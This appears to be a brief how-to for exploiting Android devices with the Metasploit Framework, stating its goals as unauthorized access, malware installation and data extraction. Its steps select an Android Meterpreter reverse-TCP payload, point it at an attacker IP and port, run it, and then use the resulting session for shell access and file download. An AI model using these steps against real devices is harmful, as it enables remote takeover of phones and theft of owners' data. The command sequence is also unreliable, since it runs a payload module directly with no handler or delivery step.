# Android Exploitation with Metasploit Framework

## Introduction
This guide provides an overview of exploiting Android devices using the Metasploit Framework. Metasploit is a powerful penetration testing framework that allows security professionals to assess the security of systems and networks. Android exploitation with Metasploit involves leveraging vulnerabilities in Android devices to gain unauthorized access, install malware, or extract sensitive information.

## Prerequisites
Before you begin exploiting Android devices with Metasploit, ensure you have the following prerequisites:
- A working installation of Metasploit Framework. You can download Metasploit from the official website: [Metasploit](https://www.metasploit.com/)
- A target Android device with vulnerabilities or permissions that allow exploitation.
- Knowledge of Android architecture, common vulnerabilities, and basic command-line usage.

## Usage
Follow these steps to exploit Android devices using Metasploit Framework:

1. **Start Metasploit Console**: Open a terminal and launch the Metasploit Framework by executing the following command:
   ```
   msfconsole
   ```

2. **Search for Android Payloads**: Use the `search` command to find Android payloads suitable for your exploitation scenario. For example:
   ```
   search android
   ```

3. **Select a Payload**: Once you've identified a suitable payload, use the `use` command to select it. For example:
   ```
   use android/meterpreter/reverse_tcp
   ```

4. **Set Payload Options**: Use the `show options` command to view and set required options for the selected payload. For example:
   ```
   show options
   set LHOST <attacker IP>
   set LPORT <attacker port>
   ```

5. **Exploit the Target**: Use the `exploit` command to initiate the exploitation process. For example:
   ```
   exploit
   ```

6. **Interact with the Session**: Once the exploit is successful, you'll gain a Meterpreter session. Use commands like `sysinfo`, `shell`, `download`, `upload`, etc., to interact with the compromised Android device.
